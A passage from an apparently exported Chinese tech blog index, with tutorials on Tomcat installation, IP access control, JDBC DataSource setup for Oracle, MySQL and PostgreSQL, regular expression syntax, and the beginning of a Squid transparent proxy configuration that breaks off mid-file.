Hosts）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时，可能想限制对Tomcat web应用的访问，比如，希望只有指定的主机或IP地址可以访问应用。这样一来，就只有那些指定的的客户端可以访问服务的内容了。为了实现这种效 果，Tomcat提供了两个参数供你配置：RemoteHostValve 和RemoteAddrValve。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过配置这两个参数，可以让你过滤来自请求的主机或IP地址，并允许或拒绝哪些主机/IP。与之类似的，在Apache的httpd文件里有对每个目录的允许/拒绝指定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以把Admin Web application设置成只允许本地访问，设置如下： 1234&lt;Context path=“/path/to/secret_files” …&gt;&lt;Valve className=“org.apache.catalina.valves.RemoteAddrValve”allow=“127.0.0.1” deny=“”/&gt;&lt;/Context&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有给出允许主机的指定，那么与拒绝主机匹配的主机就会被拒绝，除此之外的都是允许的。与之类似，如果没有给出拒绝主机的指定，那么与允许主机匹配的主机就会被允许，除此之外的都是拒绝的。]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat 安装]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F2.%20tomcat%20%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[tomcat 安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat 官网 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载 12[root@192 ~]# cd /usr/local/src[root@192 src]# wget https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-9/v9.0.0.M19/bin/apache-tomcat-9.0.0.M19.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1234[root@192 src]# tar zxf apache-tomcat-9.0.0.M19.tar.gz [root@192 src]# mv apache-tomcat-9.0.0.M19 /usr/local/tomcat[root@192 src]# cp -pv /usr/local/tomcat/bin/catalina.sh /etc/init.d/tomcat"/usr/local/tomcat/bin/catalina.sh" -&gt; "/etc/init.d/tomcat" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑配置文件 1[root@192 src]# vim /etc/init.d/tomcat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从第二行加如下配置 123456#chkconfig: 2345 63 37#description: tomcat server init script#Source Function Library./etc/init.d/functionsJAVA_HOME=/usr/local/jdk1.8.0_111CATALINA_HOME=/usr/local/tomcat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存该文件，然后把 tomcat 加入服务列表里面。 1234567891011[root@192 src]# chmod 755 /etc/init.d/tomcat[root@192 src]# chkconfig --add tomcat[root@192 src]# chkconfig tomcat on[root@192 src]# service tomcat start/etc/init.d/tomcat: line 5: ./etc/init.d/functions: Permission deniedUsing CATALINA_BASE: /usr/local/tomcatUsing CATALINA_HOME: /usr/local/tomcatUsing CATALINA_TMPDIR: /usr/local/tomcat/tempUsing JRE_HOME: /usr/local/jdk1.8.0_111Using CLASSPATH: /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jarTomcat started. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否启动 1[root@192 src]# ps aux | grep tomcat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在浏览器上输入 http://192.168.0.73:8080 可以看到 tomcat 的欢迎页。]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat连接常用数据库的用法]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F11.%20tomcat%E8%BF%9E%E6%8E%A5%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[tomcat连接常用数据库的用法一、用于数据库连接的术语：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;JDBC：（Java database connectivity）是基于java数据访问技术的一个API通过客户端访问服务器的数据库，是一个面向关系型数据库并提供一种方法查询和更新数据库； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;JNDI：(Java naming and directory interface)JNDI服务提供了对应用程序命名和目录功 能的一种用java程序编写的基于API的java平台； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DataSource：是一个通过JDBC API访问关系型数据库的java对象，当与JNDI整合并在JDNI 名称服务中注册后能更好的工作； 二、tomcat连接常用数据库的操作步骤：Tomcat配置Oracle DataSource： 在server.xml全局文件中定义如下内容： 12345678910111213&lt;GlobalNamingResources&gt; &lt;!-- Editable user database that can also be used by UserDatabaseRealm to authenticate users--&gt; &lt;Resource name="jdbc/tomcat7" auth="Container" type="javax.sql.DataSource" driverClassName="oracle.jdbc.OracleDriver" url="jdbc:oracle:thin:@127.0.0.1:1521:test" description="test database for tomcat 7" Configuration and Deployment [ 46 ] username="admin" password="admin" maxActive="20" maxIdle="10" maxWait="-1"/&gt; &lt;/GlobalNamingResources&gt; http://www.oracle.com/technetwork/database/enterprise-edition/jdbc-10201-088211.html 下载Oracle JDBC驱动程序类并放在CATALINA_HOME/lib/目录下，tomcat默认只接 受.jar结尾的类，如果是zip压缩格式需要将其重名为.jar结尾，然后放到 CATALINA_HOME/lib/目录下； 在应用下面的WEB-INF/web.xml文件中强制定义文档类型定义，示例如下： 123456&lt;resource-ref&gt; &lt;description&gt;Oracle Datasource for tomcat &lt;/description&gt; &lt;res-ref-name&gt;jdbc/tomcat7 &lt;/res-ref-name&gt; &lt;res-type&gt;javax.sql.DataSource&lt;/res-type&gt; &lt;res-auth&gt;Container&lt;/res-auth&gt; &lt;/resource-ref&gt; 开发人员在代码中引用JNDI并连接到数据库； Tomcat配置mysql DataSource： 在server.xml全局文件中定义如下内容： 123456&lt;Resource name="jdbc/tomcat7" auth="Container" type="javax.sql.DataSource" maxActive="100" maxIdle="30" maxWait="10000" username="tomcatuser" password="tomcat" driverClassName="com.mysql.jdbc.Driver" url="jdbc:mysql://localhost:3306/tomcat7"/&gt; 在应用下面的WEB-INF/web.xml文件中强制定义文档类型定义，示例如下： 12345678910111213&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd" version="2.4"&gt; &lt;description&gt;Tomcat 7 test DB&lt;/description&gt; &lt;resource-ref&gt; &lt;description&gt;DB Connection&lt;/description&gt; &lt;res-ref-name&gt;jdbc/tomcat7&lt;/res-ref-name&gt; &lt;res-type&gt;javax.sql.DataSource&lt;/res-type&gt; &lt;res-auth&gt;Container&lt;/res-auth&gt; &lt;/resource-ref&gt; &lt;/web-app&gt; http://dev.mysql.com/downloads/ 下载MYSQL JDBC驱动程序类并放在 CATALINA_HOME/lib/目录下，tomcat默认只接受.jar结尾的类，如果是zip压缩格式需 要将其重名为.jar结尾，然后放到CATALINA_HOME/lib/目录下； 对连接tomcat的用户授予全部权限，格式如下： 123456mysql&gt; GRANT ALL PRIVILEGES ON *.* TO tomcatuser@localhost IDENTIFIED BY 'tomcat7' WITH GRANT OPTION; mysql&gt; create database tomcat7; mysql&gt; use tomcat7; mysql&gt; create table testdata ( id int not null auto_increment primary key,foo varchar(25), bar int); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：用户密码一定不要为空，否则会造成连接tomcat认证错误； Tomcat配置Postgresql DataSource： 在server.xml全局文件中定义如下内容： 123456&lt;Resource name="jdbc/tomcat7" auth="Container" type="javax.sql.DataSource" driverClassName="org.postgresql.Driver" url="jdbc:postgresql://127.0.0.1:5432/tomcat7" username="tomcat7" password="tomcat" maxActive="20" maxIdle="10" maxWait="-1"/&gt; http://jdbc.postgresql.org/download.html 下载PostgreSQL JDBC驱动类并放在 CATALINA_HOME/lib/目录下，tomcat默认只接受.jar结尾的类，如果是zip压缩格式需 要将其重名为.jar结尾，然后放到CATALINA_HOME/lib/目录下； 在应用下面的WEB-INF/web.xml文件中强制定义文档类型定义，示例如下： 123456&lt;resource-ref&gt; &lt;description&gt;postgreSQL Tomcat datasource &lt;/description&gt; &lt;res-ref-name&gt;jdbc/tomcat7 &lt;/res-ref-name&gt; &lt;res-type&gt;javax.sql.DataSource&lt;/res-type&gt; &lt;res-auth&gt;Container&lt;/res-auth&gt; &lt;/resource-ref&gt;]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat 中 JDK 安装]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F1.%20tomcat%20%E4%B8%AD%20JDK%20%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[tomcat 中 JDK 安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前很多网站使用 jsp 的程序编写，所以解析 jsp 的程序就必须要有相关的软件来完成。 tomcat 就是用来解析 jsp 程序的一个软件，tomcat 是 apache 软件基金会（apache software foundation）的jakarta 项目中的一个核心项目，由 apache 、sun 和其他一些公司及个人共同开发而成。因为 tomcat 技术先进，性能稳定，而且免费，因而深受 java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的 web 应用服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat 是一个轻量级应用服务，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试 jsp 程序的首选。当在一台机器上配置好 apache 服务器，可利用它响应对 HTML 页面的访问请求。实际上 tomcat 部分是 apache 服务器的扩展，但它是独立运行的，所以运行 tomcat 时，它实际上作为一个与 apache 独立的进程单独运行的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat 的安装分为两个步骤：安装 JDK 和安装 Tomcat。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;JDK (Java Development Kit）是 Sun Microsystems 针对 Java 开发员的产品。自从 Java 推出以来，JDK 已经成为使用最广泛的 Java SDK 。JDK 是整个 Java 的核心，包括了 Java 运行环境，Java 工具和 Java 基础的类库。所以要想运行 jsp 的程序必须要有 JDK 的支持，理所当然安装 Tomcat 的前提是安装好 JDK 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先下载 JDK ，官网 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载后解压： 12[root@192 src]# tar zxvf jdk-8u111-linux-x64.tar.gz [root@192 src]# mv jdk1.8.0_111/ /usr/local/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑文件： 1[root@192 src]# vim /etc/profile.d/java.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入配置： 123456JAVA_HOME=/usr/local/jdk1.8.0_111/JAVA_BIN=/usr/local/jdk1.8.0_111/binJRE_HOME=/usr/local/jdk1.8.0_111/jrePATH=$PATH:/usr/local/jdk1.8.0_111/bin:/usr/local/jdk1.8.0_111/jre/binCLASSPATH=/usr/local/jdk1.8.0_111/jre/lib:/usr/local/jdk1.8.0_111/lib:/usr/local/jdk1.8.0_111/jre/lib/charsets.jarexport JAVA_HOME JAVA_BIN JRE_HOME PATH CLASSPATH &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后初始化环境变量： 1[root@192 src]# source /etc/profile.d/java.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果以上配置成功，下面的命令可以看到 Java 的版本： 1234[root@192 src]# java -versionjava version "1.8.0_111"Java(TM) SE Runtime Environment (build 1.8.0_111-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode)]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式-示例]]></title>
    <url>%2F2017%2F08%2F10%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F6.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[正则表达式-示例简单表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式的最简单形式是在搜索字符串中匹配其本身的单个普通字符。例如，单字符模式，如 A，不论出现在搜索字符串中的何处，它总是匹配字母 A。下面是一些单字符正则表达式模式的示例： 123/a//7//M/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以将许多单字符组合起来以形成大的表达式。例如，以下正则表达式组合了单字符表达式：a、7 和 M。 1/a7M/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请注意，没有串联运算符。只须在一个字符后面键入另一个字符。 字符匹配&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;句点 (.) 匹配字符串中的各种打印或非打印字符，只有一个字符例外。这个例外就是换行符 (\n)。下面的正则表达式匹配 aac、abc、acc、adc 等等，以及 a1c、a2c、a-c 和 a#c： 1/a.c/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要匹配包含文件名的字符串，而句点 (.) 是输入字符串的组成部分，请在正则表达式中的句点前面加反斜扛 (\) 字符。举例来说明，下面的正则表达式匹配 filename.ext： 1/filename\.ext/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些表达式只让您匹配”任何”单个字符。可能需要匹配列表中的特定字符组。例如，可能需要查找用数字表示的章节标题（Chapter 1、Chapter 2 等等）。 中括号表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要创建匹配字符组的一个列表，请在方括号（[ 和 ]）内放置一个或更多单个字符。当字符括在中括号内时，该列表称为”中括号表达式”。与在任何别的位置一样，普通字符在中括号内表示其本身，即，它在输入文本中匹配一次其本身。大多数特殊字符在中括号表达式内出现时失去它们的意义。不过也有一些例外，如： 如果 ] 字符不是第一项，它结束一个列表。若要匹配列表中的 ] 字符，请将它放在第一位，紧跟在开始 [ 后面。 \ 字符继续作为转义符。若要匹配 \ 字符，请使用 \\。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;括在中括号表达式中的字符只匹配处于正则表达式中该位置的单个字符。以下正则表达式匹配 Chapter 1、Chapter 2、Chapter 3、Chapter 4 和 Chapter 5： 1/Chapter [12345]/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请注意，单词 Chapter 和后面的空格的位置相对于中括号内的字符是固定的。中括号表达式指定的只是匹配紧跟在单词 Chapter 和空格后面的单个字符位置的字符集。这是第九个字符位置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要使用范围代替字符本身来表示匹配字符组，请使用连字符 (-) 将范围中的开始字符和结束字符分开。单个字符的字符值确定范围内的相对顺序。下面的正则表达式包含范围表达式，该范围表达式等效于上面显示的中括号中的列表。 1/Chapter [1-5]/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当以这种方式指定范围时，开始值和结束值两者都包括在范围内。注意，还有一点很重要，按 Unicode 排序顺序，开始值必须在结束值的前面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要在中括号表达式中包括连字符，请采用下列方法之一： 用反斜扛将它转义： 1[\-] 将连字符放在中括号列表的开始或结尾。下面的表达式匹配所有小写字母和连字符： 12[-a-z][a-z-] 创建一个范围，在该范围中，开始字符值小于连字符，而结束字符值等于或大于连字符。下面的两个正则表达式都满足这一要求： 12[!--][!-~] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要查找不在列表或范围内的所有字符，请将插入符号 (^) 放在列表的开头。如果插入字符出现在列表中的其他任何位置，则它匹配其本身。下面的正则表达式匹配1、2、3、4 或 5 之外的任何数字和字符： 1/Chapter [^12345]/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面的示例中，表达式在第九个位置匹配 1、2、3、4 或 5 之外的任何数字和字符。这样，例如，Chapter 7 就是一个匹配项，Chapter 9 也是一个匹配项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的表达式可以使用连字符 (-) 来表示： 1/Chapter [^1-5]/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中括号表达式的典型用途是指定任何大写或小写字母或任何数字的匹配。下面的表达式指定这样的匹配： 1/[A-Za-z0-9]/ 替换和分组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;替换使用 | 字符来允许在两个或多个替换选项之间进行选择。例如，可以扩展章节标题正则表达式，以返回比章标题范围更广的匹配项。但是，这并不象您可能认为的那样简单。替换匹配 | 字符任一侧最大的表达式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可能认为，下面的表达式匹配出现在行首和行尾、后面跟一个或两个数字的 Chapter 或 Section： 1/^Chapter|Section [1-9][0-9]&#123;0,1&#125;$/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;很遗憾，上面的正则表达式要么匹配行首的单词 Chapter，要么匹配行尾的单词 Section 及跟在其后的任何数字。如果输入字符串是 Chapter 22，那么上面的表达式只匹配单词 Chapter。如果输入字符串是 Section 22，那么该表达式匹配 Section 22。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要使正则表达式更易于控制，可以使用括号来限制替换的范围，即，确保它只应用于两个单词 Chapter 和 Section。但是，括号也用于创建子表达式，并可能捕获它们以供以后使用，这一点在有关反向引用的那一节讲述。通过在上面的正则表达式的适当位置添加括号，就可以使该正则表达式匹配 Chapter 1 或 Section 3。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的正则表达式使用括号来组合 Chapter 和 Section，以便表达式正确地起作用： 1/^(Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;尽管这些表达式正常工作，但 Chapter|Section 周围的括号还将捕获两个匹配字中的任一个供以后使用。由于在上面的表达式中只有一组括号，因此，只有一个被捕获的”子匹配项”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面的示例中，您只需要使用括号来组合单词 Chapter 和 Section 之间的选择。若要防止匹配被保存以备将来使用，请在括号内正则表达式模式之前放置 ?:。下面的修改提供相同的能力而不保存子匹配项： 1/^(?:Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除 ?: 元字符外，两个其他非捕获元字符创建被称为”预测先行”匹配的某些内容。正向预测先行使用 ?= 指定，它匹配处于括号中匹配正则表达式模式的起始点的搜索字符串。反向预测先行使用 ?! 指定，它匹配处于与正则表达式模式不匹配的字符串的起始点的搜索字符串。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，假设您有一个文档，该文档包含指向 Windows 3.1、Windows 95、Windows 98 和 Windows NT 的引用。再进一步假设，您需要更新该文档，将指向 Windows 95、Windows 98 和 Windows NT 的所有引用更改为 Windows 2000。下面的正则表达式（这是一个正向预测先行的示例）匹配 Windows 95、Windows 98 和 Windows NT： 1/Windows(?=95 |98 |NT )/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到一处匹配后，紧接着就在匹配的文本（不包括预测先行中的字符）之后搜索下一处匹配。例如，如果上面的表达式匹配 Windows 98，将在 Windows 之后而不是在 98 之后继续搜索。 其他示例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面列出一些正则表达式示例：正则表达式|描述—|—/\b([a-z]+) \1\b/gi |一个单词连续出现的位置。/(\w+):\/\/([^/:]+)(:\d)?([^# ])/ |将一个URL解析为协议、域、端口及相对路径。/^(?:Chapter|Section) [1-9][0-9]{0,1}$/ |定位章节的位置。/[-a-z]/ |a至z共26个字母再加一个-号。/ter\b/ |可匹配chapter，而不能匹配terminal。/\Bapt/ |可匹配chapter，而不能匹配aptitude。/Windows(?=95 |98 |NT )/ |可匹配Windows95或Windows98或WindowsNT，当找到一个匹配后，从Windows后面开始进行下一次的检索匹配。/^\s$/ |匹配空行。/\d{2}-\d{5}/ |验证由两位数字、一个连字符再加 5 位数字组成的 ID 号。/&lt;\s(\S+)(\s[^&gt;])?&gt;[\s\S]&lt;\s\/\1\s&gt;/ |匹配 HTML 标记。]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式-匹配规则]]></title>
    <url>%2F2017%2F08%2F10%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F5.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[正则表达式-匹配规则基本模式匹配&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一切从最基本的开始。模式，是正规表达式最基本的元素，它们是一组描述字符串特征的字符。模式可以很简单，由普通的字符串组成，也可以非常复杂，往往用特殊的字符表示一个范围内的字符、重复出现，或表示上下文。例如： 1^once &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个模式包含一个特殊的字符^，表示该模式只匹配那些以once开头的字符串。例如该模式与字符串”once upon a time”匹配，与”There once was a man from NewYork”不匹配。正如如^符号表示开头一样，$符号用来匹配那些以给定模式结尾的字符串。 1bucket$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个模式与”Who kept all of this cash in a bucket”匹配，与”buckets”不匹配。字符^和$同时使用时，表示精确匹配（字符串与模式一样）。例如： 1^bucket$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只匹配字符串”bucket”。如果一个模式不包括^和$，那么它与任何包含该模式的字符串匹配。例如：模式 1once &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;与字符串 12There once was a man from NewYorkWho kept all of his cash in a bucket. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是匹配的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在该模式中的字母(o-n-c-e)是字面的字符，也就是说，他们表示该字母本身，数字也是一样的。其他一些稍微复杂的字符，如标点符号和白字符（空格、制表符等），要用到转义序列。所有的转义序列都用反斜杠()打头。制表符的转义序列是：\t。所以如果我们要检测一个字符串是否以制表符开头，可以用这个模式： 1^\t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类似的，用\n表示”新行”，\r表示回车。其他的特殊符号，可以用在前面加上反斜杠，如反斜杠本身用\表示，句号.用.表示，以此类推。 字符簇&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在INTERNET的程序中，正规表达式通常用来验证用户的输入。当用户提交一个FORM以后，要判断输入的电话号码、地址、EMAIL地址、信用卡号码等是否有效，用普通的基于字面的字符是不够的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以要用一种更自由的描述我们要的模式的办法，它就是字符簇。要建立一个表示所有元音字符的字符簇，就把所有的元音字符放在一个方括号里： 1[AaEeIiOoUu] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个模式与任何元音字符匹配，但只能表示一个字符。用连字号可以表示一个字符的范围，如： [a-z] //匹配所有的小写字母 [A-Z] //匹配所有的大写字母 [a-zA-Z] //匹配所有的字母 [0-9] //匹配所有的数字 [0-9.-] //匹配所有的数字，句号和减号 [ \f\r\t\n] //匹配所有的白字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样的，这些也只表示一个字符，这是一个非常重要的。如果要匹配一个由一个小写字母和一位数字组成的字符串，比如”z2”、”t6”或”g7”，但不是”ab2”、”r2d3” 或”b52”的话，用这个模式： 1^[a-z][0-9]$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;尽管[a-z]代表26个字母的范围，但在这里它只能与第一个字符是小写字母的字符串匹配。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前面曾经提到^表示字符串的开头，但它还有另外一个含义。当在一组方括号里使用^是，它表示”非”或”排除”的意思，常常用来剔除某个字符。还用前面的例子，我们要求第一个字符不能是数字： 1^[^0-9][0-9]$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个模式与”&amp;5”、”g7”及”-2”是匹配的，但与”12”、”66”是不匹配的。下面是几个排除特定字符的例子： [^a-z] //除了小写字母以外的所有字符 [^\\/\^] //除了()(/)(^)之外的所有字符 [^\”\’] //除了双引号(“)和单引号(‘)之外的所有字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特殊字符”.” (点，句号)在正则表达式中用来表示除了”新行”之外的所有字符。所以模式”^.5$”与任何两个字符的、以数字5结尾和以其他非”新行”字符开头的字符串匹配。模式”.”可以匹配任何字符串，除了空串和只包括一个”新行”的字符串。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP的正规表达式有一些内置的通用字符簇，列表如下： 字符簇 描述 [[:alpha:]] 任何字母 [[:digit:]] 任何数字 [[:alnum:]] 任何字母和数字 [[:space:]] 任何空白字符 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 [[:punct:]] 任何标点符号 [[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F] 确定重复出现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到现在位置，已经知道如何去匹配一个字母或数字，但更多的情况下，可能要匹配一个单词或一组数字。一个单词有若干个字母组成，一组数字有若干个单数组成。跟在字符或字符簇后面的花括号({})用来确定前面的内容的重复出现的次数。 字符簇 描述 \^[a-zA-Z_]$ 所有的字母和下划线 \^[[:alpha:]]{3}$ 所有的3个字母的单词 ^a$ 字母a ^a{4}$ aaaa ^a{2,4}$ aa,aaa或aaaa ^a{1,3}$ a,aa或aaa ^a{2,}$ 包含多于两个a的字符串 ^a{2,} 如：aardvark和aaab，但apple不行 a{2,} 如：baad和aaa，但Nantucket不行 \t{2} 两个制表符 .{2} 所有的两个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些例子描述了花括号的三种不同的用法。一个数字 {x} 的意思是前面的字符或字符簇只出现x次 ；一个数字加逗号 {x,} 的意思是前面的内容出现x或更多的次数 ；两个数字用逗号分隔的数字 {x,y} 表示 前面的内容至少出现x次，但不超过y次。我们可以把模式扩展到更多的单词或数字： ^[a-zA-Z0-9_]{1,}$ // 所有包含一个以上的字母、数字或下划线的字符串 ^[1-9][0-9]{0,}$ // 所有的正整数 ^-{0,1}[0-9]{1,}$ // 所有的整数 ^[-]?[0-9]+.?[0-9]+$ // 所有的浮点数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后一个例子不太好理解，是吗？这么看吧：以一个可选的负号 ([-]?) 开头 (^)、跟着1个或更多的数字([0-9]+)、和一个小数点(\.)再跟上1个或多个数字([0-9]+)，并且后面没有其他任何东西($)。下面你将知道能够使用的更为简单的方法。特殊字符 ? 与 {0,1} 是相等的，它们都代表着： 0个或1个前面的内容 或 前面的内容是可选的 。所以刚才的例子可以简化为： 1^\-?[0-9]&#123;1,&#125;\.?[0-9]&#123;1,&#125;$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特殊字符 * 与 {0,} 是相等的，它们都代表着 0 个或多个前面的内容 。最后，字符 + 与 {1,} 是相等的，表示 1 个或多个前面的内容 ，所以上面的4个例子可以写成： ^[a-zA-Z0-9_]+$ // 所有包含一个以上的字母、数字或下划线的字符串 ^[1-9][0-9]*$ // 所有的正整数 ^-?[0-9]+$ // 所有的整数 ^-?[0-9]+.?[0-9]*$ // 所有的浮点数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然这并不能从技术上降低正规表达式的复杂性，但可以使它们更容易阅读。]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid 透明代理配置]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F8.%20squid%20%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[squid 透明代理配置什么是透明代理？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的request fields（报文），并会传送真实IP，多用于路由器的NAT转发中。 透明代理的原理： 假设A为内部网络客户机 B为外部网络服务器，B提供的服务为httpd服务，监听端口为80 C为代理服务器（也是我们的网关），假如代理服务器提供服务端口为3128 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过程： 当A向B的80端口请求数据时，TCP连接请求要先经过C，C看到A请求的是B的80端口时，C由于已经设置了转发规则，所以C会把A的请求80端口转发到自己的3128端口，也就是说A将要直接访问C的3128端口，而非B服务器的80端口，此时，C会先去访问B的80端口，把A要访问B的请求数据先请求过来，保存到C上，然后C再把请求数据吐给A。而在A看来，它貌似是直接请求的B，而实际并非如此。由于这些连接过程是自动的，不需要客户端手工配置代理服务器，甚至用户根本不知道代理服务器的存在，因而对用户来说是透明的。 来配置透明代理：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过上面的原理分析，可知，只有代理服务器为网关时，才可以实现透明代理的功能，否则无效。实际应用中，透明代理服务器应该有至少两个网卡，第一个网卡连接到外网，或者它可以直接上网，第二个网卡连接的是内部的一个局域网段，也就是想使用代理上网的网段。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设，透明代理服务器的网卡1eth0设置IP为 10.2.1.100（可以上网的ip）, 网卡2eth1的ip设置为192.168.19.1，那么要通过透明代理上网的局域网段应该为 192.168.19.0/24，并且在该局域网的客户机应该设置的网关地址为192.168.19.1. 1.安装squid1yum install -y squid 2.配置squid12rm -f /etc/squid/squid.confvim /etc/squid/squid.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入如下内容： 12345678910111213141516171819202122232425262728http_port 3128 transparentacl manager proto cache_objectacl localhost src 127.0.0.1/32 ::1acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1acl localnet src 